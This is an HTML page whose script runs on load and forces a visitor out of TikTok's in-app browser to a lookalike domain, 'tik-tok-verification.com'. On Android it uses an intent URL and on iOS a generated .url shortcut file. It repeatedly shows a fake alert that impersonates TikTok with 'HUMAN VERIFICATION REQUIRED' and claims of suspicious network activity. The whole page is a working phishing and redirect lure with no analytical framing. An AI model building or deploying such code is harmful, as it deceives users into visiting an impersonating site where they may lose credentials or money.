<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 15000;

    function forceExternalJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: This specific "VIEW" intent with a browser category
            // is the strongest way to force an external browser.
            window.location.href = `intent://${targetUrl.replace(/^https?:\/\//, '')}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: Creating an External Internet Shortcut (.url)
            // TikTok can't render this file type, forcing the OS to open Safari.
            const urlFileContent = `[InternetShortcut]\nURL=${targetUrl}`;
            const blob = new Blob([urlFileContent], {type: 'application/x-mswinurl'});
            const blobUrl = URL.createObjectURL(blob);
            
            // This triggers the "Download" or "Open in Safari" prompt
            window.location.href = blobUrl;
            
            // Backup: Direct hit
            setTimeout(() => {
                window.location.assign(targetUrl);
            }, 150);
        }
    }

    function securityLogic() {
        if (Date.now() > killTime) return;

        // 1. Initial Force
        forceExternalJump();

        // 2. Focus Detection (Wait for user action)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // 3. User Gesture Relay (Immediately after OK)
                forceExternalJump();

                setTimeout(securityLogic, 400);
            }
        }, 400);
    }

    window.onload = securityLogic;
    window.onfocus = () => { if (Date.now() < killTime) securityLogic(); };
</script>

</body>
</html>
